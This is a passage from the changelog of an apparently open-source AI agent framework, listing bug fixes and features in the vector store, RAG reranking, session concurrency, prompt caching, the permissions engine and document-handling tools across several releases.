- `internal/vector`: `OpenSearchStore.ensureIndex` raced under concurrent use - two ingests both seeing a not-yet-existing namespace would both call `Indices.Create`, and the loser got `resource_already_exists_exception` back as a hard failure instead of the idempotent success it actually is. Now tolerated.
- `internal/vector`: `OpenSearchStore.Get(ctx, namespace, nil)` ("all records in the namespace," a contract the `Store` interface explicitly documents) capped itself at a single `size: 10000` query - a namespace with more chunks than that silently returned only the first 10,000, with no error to signal the truncation. Now paginates with `search_after` until a page comes back short, so it actually returns everything.
- `internal/memory`: `Manager.DeleteEntry` only removed an entry from the searchable catalog, never from the underlying `ProjectMemory`/`UserMemory` entry map it was actually persisted in - so the very next `rebuildCatalog` (triggered by any `Load*` call, e.g. a process restart) silently resurrected it from that map. Now removes from both, and persists the removal.
- `internal/engine`: `Session.SubmitMessage`/`SubmitMessageWithContent` had no guard against a second concurrent call on the same session - only `cancelFn` was mutex-protected, so two turns submitted in parallel would both mutate `Session.state.Messages`/`Metadata` and persist independently (a lost-update race). A session now rejects a `SubmitMessage` while one is already in progress (`"session is busy"`) or after `Close()` (`"session is closed"`) instead of racing. `Close()` is now idempotent and, if a turn is running, cancels it before tearing down the event queues underneath it, instead of potentially doing both at once.
- `internal/rag`: `Service.Search`'s reranking step fully replaced vector/BM25 order and score with whatever the configured `Reranker` returned, trusting its raw score as-is (a provider returning unbounded logits instead of a calibrated [0,1] relevance score would corrupt any downstream comparison) - a confidently-wrong rerank call could bury a strong retrieval match with no way to hedge against it. `reranker.NormalizeScores` now min-max scales an out-of-range score batch into [0,1] (a no-op when already in range), and `Search` blends the normalized rerank score with each result's original retrieval score instead of overriding it - `SearchRequest.RerankWeight` (0-1, defaulting to `Service`'s configured weight, itself defaulting to 0.7) controls the blend ratio; `Service.SetRerankWeight` and the `RAG_RERANK_WEIGHT` environment variable (`cmd/cli`) adjust the default.
- `internal/tools/system/skills`: the multi-user skills directory (`skills/users/`) was missing from the "reserved" exclusion list used when scanning the skills root for extra collections, so every tool-registry build recursively loaded every *other* user's skills alongside the current user's own - unbounded, and duplicating work the per-user loader already did correctly. Measured ~980ms wasted per turn on a dev machine with hundreds of provisioned users; now ~0.5ms.
- `internal/sandbox`: `NewExecutor` rebuilt a fresh `*DockerExecutor` (re-reaping orphan containers via `docker ps -a`) on every call instead of the "once at process startup" its own docs assumed - now cached process-wide per `DockerExecutorConfig`. `Healthy` also caches its `docker version` probe result (10 minutes) instead of re-shelling out on every call. Together with the skills fix above, a host that rebuilds its `*sdk.Client` per turn (the common case before client-level caching) no longer pays ~1.9s of avoidable per-turn overhead for these two alone.
- `pkg/dataflow`: the `agent` node's own `agent` parameter is optional again (it was briefly made required in the agent/query/tools split above, caught by a downstream consumer's own built-in-template test failing immediately after upgrading) - a `query` node must always reference an `agent` node (Validate still enforces that structural link), but the referenced `agent` node itself can exist with no persona picked yet, same as before the split: empty means "use the job's own default agent." Fixes a template or mid-edit graph with an unconfigured identity being rejected outright instead of only once actually run.
- `internal/vector`: `OpenSearchStore.DeleteKeys` treated a 404 "not_found" delete response (a key already removed, or never written) as a hard failure instead of the silent no-op every other `VectorStore` backend gives it (Qdrant/Chroma explicitly swallow their own not-found shape; pgvector/sqlite/hnsw/memory are naturally idempotent) and that `Service.DeleteFileChunks`'s own doc comment assumes. In practice this permanently failed re-ingesting any file whose stale-chunk cleanup range included an already-deleted chunk - the ingest job would exhaust all retries and stay `failed` forever, since the same benign 404 recurred on every attempt.

## [1.2.26] — 2026-09-02

### Added
- `pkg/dataflow`: a new deterministic node-graph workflow engine — level-based topological execution, cycle detection, port-based data routing for conditional branching (`if`/`switch`). Complements `pkg/workflow` (a multi-agent DAG where every node costs an LLM call) rather than replacing it: two built-in node types, `agent` (a single scoped agent turn) and `subworkflow` (delegates to `pkg/workflow.Run`), let a deterministic graph invoke a multi-agent chain for the one step that genuinely needs judgment, without either engine reimplementing the other's execution model. `Runtime` carries per-run dependencies (secrets, agent/subworkflow callers) injected by the caller rather than owned by this package, so it never stores a credential or holds an `sdk.Client` directly.

Design and several pieces (the level-based execution/cycle-detection approach, the HTTP node's SSRF blocklist) adapted from [neul-labs/m9m](https://github.com/neul-labs/m9m) (MIT license, see `pkg/dataflow/NOTICE`) — studied as a reference after deciding not to import it as a dependency (two young projects coupling was judged too risky for something this central). Registry and alias mapping repointed at the current models.
- `internal/providers/client.go`: Foundry's structured `SystemPromptBlocks` (carrying `cache_control`) were only preserved for `provider == APIProviderAnthropic`; every other provider sharing this request builder — including Foundry, which speaks the identical Anthropic Messages format and already gets tool-definition caching — fell back to a flattening path that drops `CacheControl` entirely, silently degrading Foundry's system-prompt cache to uncached.
- `internal/types/message.go`, `internal/providers/client.go`: Anthropic prompt caching only ever covered the stable half of the system prompt and the last tool definition — `TextContent` and `ToolResultContent` had no `CacheControl` field at all, so the growing conversation/tool-result history in a long agentic loop was resent uncached on every single call. Both types now carry `CacheControl`, and a new `anthropicMessagesWithCacheControl` marks the last cacheable block of the last message before serialization, mirroring the existing tool-caching pattern.
- `internal/providers/client.go`: `ResponseHeaderTimeout` (60s) was shared by every provider, with no override for Ollama — a local request can legitimately block behind loading a large model into memory longer than that. Ollama now gets a 5-minute timeout instead of the shared 60s default.
- `internal/providers/registry.go`: three registry corrections, each verified against official docs before changing anything — Kimi's `SupportsPC` was `false` despite Moonshot's fully automatic server-side caching (no client action required, so the flag was wrong regardless of what this codebase's own request building does); OpenRouter's provider-level `SupportsPC: true` was never backed by any of its 3 listed models, and this codebase routes it through the OpenAI-compatible adapter with no `cache_control` field at all, so it's now `false` to match what's actually implemented; Mistral Small's context window (`32768`) matched the superseded Mistral Small 3, corrected to `131072` (128K) for the current Mistral Small 3.1.

### Changed
- `docling_convert`'s tool description now explicitly tells the agent to convert a whole PPTX/document in a single call rather than improvising a per-slide/per-image workaround (terminal commands, ad-hoc scripts, individually OCR'ing extracted slide images) — observed in a real session, this produced many small tool calls instead of the one call docling-serve is designed to handle in a single pass, with worse layout/reading-order/table-structure results than letting docling process the whole document at once.
- `internal/engine/session.go`: async session-title generation (`generateTitleAsync`, wired through `Engine.SetOnSessionTitled`) now fires as soon as a new session's first message is persisted, instead of after that first turn finishes. It only ever reads the first user message text — never the assistant's response — so gating it on turn completion had no functional reason and just meant a session sat as "Untitled" through the entirety of its first (often the longest) reply before a client polling for the title would ever see one. `firstUserMessageText`, only used by the old post-turn call site, is removed; the trigger now passes the already-in-hand submitted text directly.
- `internal/officetext`: `Extract`'s `.pptx` path only reported whether *any* text was found (`ok`), not whether it was plausible for the deck's size — a slide deck that's mostly screenshots/diagrams with only a title or two of real text would "succeed" and short-circuit before ever reaching docling-serve for OCR, silently dropping almost all of the deck's actual content. `Extract` now also returns `sparse` (true when extracted text is below `MinCharsPerSlide` per slide, mirroring `pdftext.Result.Sparse`'s existing per-page heuristic for scanned PDFs), and `read_file`'s docling fallback path treats a sparse PPTX the same as an empty one: automatic escalation to docling, no agent judgment call required. `Extract`'s signature changed (`(markdown, ok, err)` → `(markdown, ok, sparse, err)`) — a breaking change for the handful of internal and external (seshat-ai) callers, all updated in this release.

### Removed
- `internal/providers/config.go`: `Config.BuildAuthHeaders()` had zero references anywhere, including tests — a stale, unmaintained duplicate of the auth logic that actually runs (`adapter.go`'s `applyAuthHeaders`).

## [1.2.3] — 2026-08-01

### Fixed
- `internal/permissions/engine.go`: `get_file_metadata` (a read-only `stat()` call, `RequiresPermission: false` in its own definition) was missing from `isAlwaysSafeTool`, so in Auto permission mode every call went through the two-stage LLM classifier instead of being heuristically allowed — extra API calls per check, and, observed live, an incorrect "blocking for safety" deny when the classifier's own response failed to parse, compounding with provider rate limits.
- Same file: audited every registered tool for the same gap and added 19 more with an identical, individually-verified safety profile (`IsReadOnly: true`, `RequiresPermission: false`, `IsDestructive: false`, and a trivial passthrough `CheckPermissions` with no conditional logic) — `notebook_read`; the read/search/fetch tools in `devto`, `hackernews`, `reddit`, `twitter` (their write/publish siblings are correctly left requiring classification); `get_config`, `get_goal`, `rag_search`, `repo_map`, `workflow_draft`; `seshat_list_skills`, `seshat_read_skill`, `seshat_validate_skill`; `list_agents`, `wait_agent`.

### Notes
- Deliberately not touched in this pass, pending a follow-up decision: the browser read tools (`browser_snapshot`/`browser_screenshot`/etc. — mechanically read-only, but a live browser session can be authenticated into real accounts, a different risk profile than a filesystem read) and `job_output`/`task_get`/`task_list`/`task_output`/`monitor` (heterogeneous `CheckPermissions` implementations — `task_get` has real conditional deny logic that `isAlwaysSafeTool`'s short-circuit would bypass entirely, unlike the trivial-passthrough tools added above).

## [1.2.2] — 2026-08-01

### Fixed
- `internal/agent/goal`: the durable goal store wrote through to its SQLite backend on every plain `Get()` (not just on mutation), and held its mutex during backend I/O in `Update`/`RecordTokenUsage` — under an active goal the runner reads goal state up to three times per agent turn, so this added needless write amplification and let one session's backend latency stall unrelated sessions through the shared lock. Reads are now lock-scoped snapshots that never write, and mutation methods release the lock before calling the backend. Returned `Goal` values are now always defensive clones, so callers can no longer mutate store-internal state without going through the mutex.
- `internal/seshattui/ui/dialog/doctor.go`, `internal/seshattui/ui/model/ui.go`: opening or refreshing the TUI's Doctor dialog ran `DoctorReport()` (SQLite ping, `git`/`uv` subprocess checks) synchronously inside Bubble Tea's event loop, freezing the whole UI for as long as those checks took. Both paths now dispatch through a `tea.Cmd`.
- `cmd/cli/background.go`: `seshat run --bg --name X` had a TOCTOU race — the name-availability check only scanned already-saved session files, but a new session isn't saved until after its process starts, so two concurrent launches with the same name could both pass the check and leave two live sessions sharing one name. Name reservation is now atomic (`O_EXCL`) and happens before the process starts.
- `pkg/companion`: `companion.Save` wrote profile data with a plain truncate-and-write, so a crash mid-write could corrupt `companion.json` and turn the next load into a hard error instead of falling back to defaults. It now writes to a temp file and renames it into place, matching the pattern already used for background session metadata.

### Notes
- The `v1.2.0` GitHub release was cut prematurely from a feature branch before it merged to `main` and has been marked as a superseded pre-release; `v1.2.1` was the first correct build of the feature set below.

## [1.2.1] — 2026-08-01

### Added
- Goals created through `create_goal` are now persisted in the SQLite session database when `SessionSQLitePath` is configured, and successful session turns record token usage against the active goal so `get_goal`/`update_goal` can survive client/session restart.
- TUI chat now replaces hidden `task_create`/`task_update` plan tool calls with a compact "Plan" task checklist block, keeping plan progress visible without exposing internal task tools.
- `seshat doctor` command backed by reusable `pkg/doctor` diagnostics for local config, runtime paths, SQLite session storage, provider credentials, and helper tools.
- TUI settings hub now exposes the same doctor diagnostics in a scrollable "Doctor" dialog with refresh support.
- `pkg/repomap`, `seshat repomap`, and the read-only `repo_map` tool provide Go-first repository structure summaries, with optional system-context injection via `SESHAT_REPO_MAP=1`.
- Local background session commands: `seshat run --bg [--name NAME] "PROMPT"` starts a detached child process, while `seshat ps`, `seshat logs <id-or-name> [-f]`, `seshat attach <id-or-name>`, and `seshat kill <id-or-name>` manage tracked background runs.
- `pkg/workflow`, `Client.RunWorkflow`, and `seshat workflow run <file>` provide a minimal static YAML/JSON DAG runner: nodes declare `needs`, independent nodes run in parallel, and dependency outputs are injected into downstream prompts.
- `workflow_draft` and `sdk.DraftWorkflow` let agents and headless hosts validate and render reusable static workflow DAG definitions before saving or running them.
- Workflow nodes now support `kind: agent|verifier|critic|router`; role-specific prompt scaffolding helps agents build review, critique, and routing stages while keeping the runner's execution model static.
- `pkg/companion`, `ClientConfig.Companion`, and `seshat companion` add a headless-first companion profile that can inject a lightweight collaboration presence into sessions without replacing the core Seshat system prompt.
- Kimi/Moonshot is now consistently available from CLI and TUI provider setup, using the international `https://api.moonshot.ai/v1` endpoint and OpenAI-compatible Bearer auth.

## [1.1.0] — 2026-08-01

### Added
- `excel_edit` tool: create/edit `.xlsx` cells and formulas natively (excelize), with a read-before-write gate matching `write_file`/`edit_file`.
- `docx_edit` tool: create Word documents from plain/markdown-ish text (`#`.."######" → real Word heading styles) or find/replace edit existing ones, with fuzzy-match diagnostics on a near-miss.
- `write_pdf` tool: create/append/delete-pages PDFs via `go-pdf/fpdf` + `pdfcpu` — no headless-browser dependency.
- `search_start` tool: cancellable, streaming background content search (reuses `job_output`/`job_kill`) that also searches inside `.docx`/`.pptx`/`.xlsx` content, which ripgrep can't see.
- `get_config` tool (read-only): exposes the effective security policy — denied command fragments/patterns, commands requiring approval, read/write-denied path prefixes, file-read limits, sandbox availability, default shell.
- `internal/tools/files/documentreader` package: `read_document_url` (moved from `files/read_url`) plus new `convert_document` for explicit local-file conversion (OCR, complex slide decks, audio transcription) — FileRead's own automatic document-reader fallback is unchanged.
- `rag_delete` tool: delete an entire corpus or a single file's chunks — previously unreachable capability (`Service.DeleteNamespace`/`DeleteFileChunks` existed but no tool exposed them).
- `rag_ingest` gains an optional `file_id` param (defaults to `filename`) for idempotent re-ingest — re-ingesting the same file now replaces its chunks instead of accumulating duplicates.
- **Vectorless RAG**: `rag_ingest`/`rag_search` now work without any embedding provider configured, via pure BM25/keyword ranking (real BM25 through SQLite FTS5; keyword-overlap scoring on HNSW/Memory). Previously RAG was hard-disabled with no embedder at all.
- RAG now falls back to the SQLite vector backend when the embedded HNSW backend is unavailable — notably on Windows, where `github.com/coder/hnsw`'s atomic-write dependency doesn't build, which previously disabled RAG entirely regardless of configuration.
- Reranking now actually runs: `SetReranker` was implemented but never wired up; RAG search now reranks results when a reranker is configured.
- Reranker generalized beyond LangSearch's hosted API into `HTTPReranker`, additionally speaking HuggingFace TEI's shape — point `RAG_RERANK_URL` at a self-hosted TEI/vLLM instance (e.g. `BAAI/bge-reranker-v2-m3`) for a free alternative requiring no API key.
- `SemanticChunker` (embedding-similarity sentence grouping) is now actually used by the CLI's RAG wiring when an embedder is configured, instead of always falling back to the naive `ParagraphChunker`.
- No-API-key DuckDuckGo fallback provider for `web_search`.
- `pkg/rag/embedder`: `FromEnv()`/`NewFromEnv()` (parity with `pkg/rag/reranker`).
- `pkg/web/search/providers`: `NewDuckDuckGoProvider()` and `ProviderModeDuckDuckGo` (parity with the other providers in the same file).
- `pkg/rag`: `ParagraphChunker`, `SemanticChunker`, `DefaultChunker()`, `NewSemanticChunker()`, `ArtifactKey()` — `NewService` requires a `Chunker` argument, but no implementation was previously reachable from the public API.
- `pkg/image` + `pkg/image/providers` (OpenAI DALL-E, Google Imagen) and `pkg/audio/stt` + `pkg/audio/tts` + `pkg/audio/providers` (OpenAI Whisper/TTS): standalone client libraries, mirroring `pkg/docling` — a host application can now call image/speech generation directly (e.g. a UI where a human types a prompt) without going through the agent's LLM tool-calling loop for a deterministic action. The same provider implementations power both the direct call and the `generate_image`/`text_to_speech`/`speech_to_text` agent tools. `WithSTTBaseURL`/`WithOpenAIBaseURL`/`WithTTSBaseURL` all support pointing at a self-hosted, OpenAI-API-compatible server (e.g. a local whisper.cpp instance) with no API key.
- `pkg/fim` + `pkg/fim/providers` (Mistral Codestral, DeepSeek): same standalone-client treatment for Fill-in-the-Middle code completion, previously reachable only through the `code_complete` agent tool. FIM is explicitly suited to IDE integrations/in-editor ghost text, where a tool-calling LLM turn per keystroke makes no sense.
- Session auto-title generation feature: AI auto-titles sessions after the first successful turn using the user message.
- `OnSessionTitled` callback and `DisableTitleGeneration` configuration options in `ClientConfig`.
- `CredentialResolver` interface in `pkg/sdk` — allows per-request API key injection without touching `ClientConfig.APIKey`
- `generate_image` tool backed by `image.Generation` interface (OpenAI DALL-E 3 and Google Gemini Imagen providers)
- `text_to_speech` and `speech_to_text` tools backed by pluggable audio providers (OpenAI TTS-1, Whisper)
- OpenTelemetry tracing (`internal/monitoring/tracer.go`) — OTLP gRPC export, no-op when `OTEL_EXPORTER_OTLP_ENDPOINT` is unset
- `pkg/monitoring` public package exposing `InitTracer` and `Tracer`
- `.github/workflows/ci.yml` — build, test (race), lint on push/PR
- `.github/workflows/release.yml` — cross-platform binary release on `v*` tags
- `.githooks/pre-commit` — gofmt + go vet + golangci-lint (install with `make hooks`)
- `SetDefault` and `GetDefaultByUserID` on `ProviderSettingStore`
- Community files: `SECURITY.md`, `CONTRIBUTING.md`, `CODE_OF_CONDUCT.md`, `AGENTS.md`
- Architecture diagrams in `docs/vision/diagrams.md` (Mermaid)
- Project vision and 3-level roadmap in `docs/vision/`

- Makefile: replaced `build-api` (removed) with `build-grpc`; added `fmt`, `vet`, `hooks` targets
- `docs/architecture.md`: removed `cmd/api` from entry points (it lives in nexus-product)
- `docs/transports.md`: translated to English, removed HTTP API section (nexus-product), fixed absolute paths

### Fixed
- `internal/tools/files/patch/patch.go`: replaced `if HasSuffix` with `strings.TrimSuffix` (golangci-lint S1017)
- `internal/providers/auth.go`: removed OAuth credential values from log output (security: S1)
- `pkg/rag/embedder`: `EmbedTexts` now splits large requests into batches (default 64 texts), since some hosted embedding APIs (e.g. Mistral) reject an oversized request outright instead of truncating it
- `readDoclingFile` (FileRead's docling path) now records read-state on all three success paths, fixing a false "file has not been read yet" block on binary formats read via docling.
- A re-ingested RAG file that shrank (fewer chunks than its previous version) no longer leaves the old version's stale trailing chunks behind — `Service.Ingest` now cleans them up via the existing (but previously unused) `DeleteFileChunks`.
- `ParagraphChunker.Split` now slices by rune instead of byte index — a byte-index cut could land inside a multi-byte UTF-8 character (e.g. accented French text) and corrupt it at the chunk boundary.
- Fixed a "typed nil" bug found while wiring up vectorless RAG: passing a nil `*embedder.Embedder` into an `Embedder` interface parameter produced a non-nil interface wrapping a nil pointer, so `embedder != nil` checks were incorrectly true and the first call panicked on a nil receiver.
